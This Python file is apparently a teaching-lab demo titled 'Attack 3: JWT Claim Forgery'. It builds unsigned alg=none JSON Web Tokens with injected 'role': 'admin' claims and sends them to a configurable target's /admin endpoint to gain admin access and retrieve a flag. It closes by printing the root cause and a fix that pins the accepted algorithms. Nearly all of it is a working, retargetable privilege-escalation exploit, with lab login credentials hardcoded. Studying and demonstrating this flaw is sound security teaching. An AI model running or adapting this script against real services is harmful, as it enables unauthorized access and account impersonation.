"""
attack_forgery.py — Attack 3: JWT Claim Forgery (Privilege Escalation)
=======================================================================
MITRE ATT&CK: T1550.001 — Use Alternate Authentication Material

HOW IT WORKS:
  Claim forgery is the GOAL that makes Attacks 1 and 2 dangerous.
  Once a server accepts an unsigned or confusion-signed token, the attacker
  controls the entire payload — they can inject ANY claims they want.

  This script demonstrates claim forgery in its simplest standalone form:
    1. Build a token with alg=none (server skips signature check)
    2. Inject "role": "admin" into the payload
    3. Call /admin — server reads role from the forged payload and grants access

  The server never had an admin account involved. No password was guessed.
  No private key was needed. Just base64url-encode whatever claims you want.

  Why this matters:
    - "role", "sub", "email", "scope", "permissions" — all forgeable
    - Real apps authorize every action based on JWT claims
    - One vulnerable endpoint means full privilege escalation

DIFFERENCE FROM attack_none.py:
  attack_none.py demonstrates the bypass mechanism.
  THIS file focuses on the payload manipulation — what an attacker injects
  and why the server trusts it. Suitable to walk through claim-by-claim.

DEMO OUTCOME:
  - Forged token with role=admin  → /admin returns HTTP 200 + flag
  - Legitimate alice token (role=user) → /admin returns HTTP 403 (for contrast)
"""

import base64
import json
import requests

TARGET = "http://10.236.147.152:5000"   # vulnerable server — change if needed


# ── Helpers ───────────────────────────────────────────────────────────────────

def _b64url(data: dict) -> str:
    return (
        base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode())
        .rstrip(b"=").decode()
    )


def _b64url_decode(s: str) -> dict:
    s += "=" * (4 - len(s) % 4)
    return json.loads(base64.urlsafe_b64decode(s))


def forge_claims(claims: dict) -> str:
    """Build an alg=none token with the given payload claims."""
    header  = _b64url({"alg": "none", "typ": "JWT"})
    payload = _b64url(claims)
    return f"{header}.{payload}."   # empty signature


def hit_admin(token: str, label: str) -> None:
    """Send token to /admin and print the result."""
    try:
        r = requests.get(
            f"{TARGET}/admin",
            headers={"Authorization": f"Bearer {token}"},
            timeout=4,
        )
        tag = "SUCCESS ✓" if r.status_code == 200 else "BLOCKED ✗"
        print(f"  [{tag}]  {label}  →  HTTP {r.status_code}")
        body = r.json()
        if r.status_code == 200:
            print(f"           flag = {body.get('flag', '(none)')}")
        else:
            print(f"           error = {body.get('error', '?')}")
    except requests.exceptions.ConnectionError:
        print(f"  [ERR]  Cannot reach {TARGET}")


def banner():
    print("=" * 65)
    print("  ATTACK 3 — CLAIM FORGERY (Privilege Escalation)")
    print("  MITRE ATT&CK: T1550.001")
    print(f"  Target: {TARGET}/admin")
    print("=" * 65)


# ── Main ──────────────────────────────────────────────────────────────────────

def run():
    banner()

    # Step 1 — get a real alice token to show what a legitimate user sees
    print("\n[1] Get legitimate alice token (role=user) for comparison...")
    try:
        r = requests.post(
            f"{TARGET}/login",
            json={"username": "alice", "password": "pass123"},
            timeout=4,
        )
        alice_token = r.json().get("token", "")
        decoded_payload = _b64url_decode(alice_token.split(".")[1])
        print(f"  alice token payload: {decoded_payload}")
    except Exception:
        alice_token = ""
        print("  (could not reach login — continuing with forgery demo)")

    # Step 2 — show alice (role=user) is forbidden from /admin
    print("\n[2] alice (role=user) tries /admin — should be forbidden:")
    if alice_token:
        hit_admin(alice_token, "alice real token  (role=user)")

    # Step 3 — forge a token with role=admin using alg=none
    print("\n[3] Forge token by injecting role=admin into payload (alg=none):")
    forged_claims = {"user": "attacker", "role": "admin"}
    forged_token  = forge_claims(forged_claims)

    # Decode and show what the payload contains
    forged_payload = _b64url_decode(forged_token.split(".")[1])
    print(f"  Forged payload : {forged_payload}")
    print(f"  Forged token   : {forged_token[:80]}...")

    # Step 4 — send forged token to /admin
    print("\n[4] Send forged token to /admin — server trusts the payload:")
    hit_admin(forged_token, "forged token     (role=admin injected)")

    # Step 5 — show extra claim variations (escalate to any identity)
    print("\n[5] Bonus — forge as 'admin' user account directly:")
    hit_admin(
        forge_claims({"user": "admin", "role": "admin"}),
        "forged as user=admin, role=admin",
    )

    print()
    print("  ROOT CAUSE: Server trusts alg field from token header.")
    print("  alg=none → signature skipped → attacker controls entire payload.")
    print()
    print("  FIX: algorithms=['RS256'] in jwt.decode() — PyJWT rejects")
    print("       alg=none before it reads the payload.")
    print()


if __name__ == "__main__":
    run()
